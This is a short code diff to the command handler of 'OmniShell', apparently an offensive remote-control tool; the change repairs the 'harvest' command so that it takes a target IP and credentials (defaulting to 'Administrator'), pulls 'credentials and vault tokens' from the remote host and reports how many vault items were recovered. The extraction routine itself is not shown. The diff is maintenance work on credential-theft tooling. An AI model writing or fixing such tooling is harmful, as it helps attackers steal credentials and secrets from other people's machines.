@@ -109,13 +109,15 @@ class OmniShell:
 
         elif cmd == "harvest":
             if not args:
-                print(f"{Fore.RED}[!] Usage: harvest <ip> <user> <pass>")
+                print(f"{Fore.RED}[!] Usage: harvest <ip> [user] [pass]")
                 return
-                user = args[1] if len(args) > 1 else "Administrator"
-                pwd = args[2] if len(args) > 2 else ""
-                print(f"{Fore.MAGENTA}[*] Harvesting credentials and vault tokens from {args[0]}...")
-                data = await self.control.extract_all_data(args[0], user, pwd)
-                print(f"{Fore.GREEN}[+] Harvest complete. Stored in local DB.")
+            
+            target = args[0]
+            user = args[1] if len(args) > 1 else "Administrator"
+            pwd = args[2] if len(args) > 2 else ""
+            print(f"{Fore.MAGENTA}[*] Harvesting credentials and vault tokens from {target}...")
+            data = await asyncio.to_thread(self.control.extract_all_data, target, user, pwd)
+            print(f"{Fore.GREEN}[+] Harvest complete. Recovery: {len(data.get('credentials', {}))} vault items.")
 
         elif cmd == "targets":
             self.list_targets()
